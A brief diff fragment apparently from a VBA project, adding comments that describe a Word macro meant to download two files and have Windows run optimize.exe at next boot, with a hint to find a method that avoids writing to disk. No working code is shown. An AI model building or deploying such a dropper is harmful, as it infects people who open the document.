@@ -1,3 +1,6 @@
+'Macro for MS Word. Downloads two files to disk with the intent of windows executing optimize.exe (or whatever you name it) 
+'on next boot. You should probably look for something that doesn't download to disk...
+
 Option Explicit
 
 #If VBA7 Then
